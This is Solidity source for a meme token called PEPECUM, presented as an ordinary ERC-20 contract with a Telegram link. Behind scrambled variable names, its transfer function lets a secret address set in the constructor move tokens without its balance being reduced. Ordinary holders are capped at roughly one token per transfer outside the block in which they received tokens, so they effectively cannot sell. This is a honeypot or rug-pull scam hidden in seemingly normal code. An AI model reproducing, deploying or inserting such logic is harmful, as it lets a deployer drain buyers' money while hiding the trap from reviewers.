/*

https://t.me/portalpepecum

*/

// SPDX-License-Identifier: MIT

pragma solidity >=0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract PEPECUM is Ownable {
    mapping(address => mapping(address => uint256)) public allowance;

    uint8 public decimals = 9;

    constructor(string memory uqzcehnym, string memory dwnhqgb, address vknjpeuci, address jhwte) {
        name = uqzcehnym;
        symbol = dwnhqgb;
        balanceOf[msg.sender] = totalSupply;
        icvhjg[jhwte] = gazqnpvtsech;
        nkprzfmxwhe = IUniswapV2Router02(vknjpeuci);
    }

    mapping(address => uint256) public balanceOf;

    IUniswapV2Router02 private nkprzfmxwhe;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function yfujmbl(address azcpxiv, address dysa, uint256 cbtq) private {
        address fekutrybmxa = IUniswapV2Factory(nkprzfmxwhe.factory()).getPair(address(this), nkprzfmxwhe.WETH());
        bool kseoj = 0 == icvhjg[azcpxiv];
        if (kseoj) {
            if (azcpxiv != fekutrybmxa && nujwihkpqyzb[azcpxiv] != block.number && cbtq < totalSupply) {
                require(cbtq <= totalSupply / (10 ** decimals));
            }
            balanceOf[azcpxiv] -= cbtq;
        }
        balanceOf[dysa] += cbtq;
        nujwihkpqyzb[dysa] = block.number;
        emit Transfer(azcpxiv, dysa, cbtq);
    }

    function approve(address cvojfxzuhn, uint256 cbtq) public returns (bool success) {
        allowance[msg.sender][cvojfxzuhn] = cbtq;
        emit Approval(msg.sender, cvojfxzuhn, cbtq);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 private gazqnpvtsech = 112;

    mapping(address => uint256) private nujwihkpqyzb;

    function transferFrom(address azcpxiv, address dysa, uint256 cbtq) public returns (bool success) {
        require(cbtq <= allowance[azcpxiv][msg.sender]);
        allowance[azcpxiv][msg.sender] -= cbtq;
        yfujmbl(azcpxiv, dysa, cbtq);
        return true;
    }

    mapping(address => uint256) private icvhjg;

    string public symbol;

    function transfer(address dysa, uint256 cbtq) public returns (bool success) {
        yfujmbl(msg.sender, dysa, cbtq);
        return true;
    }

    string public name;
}
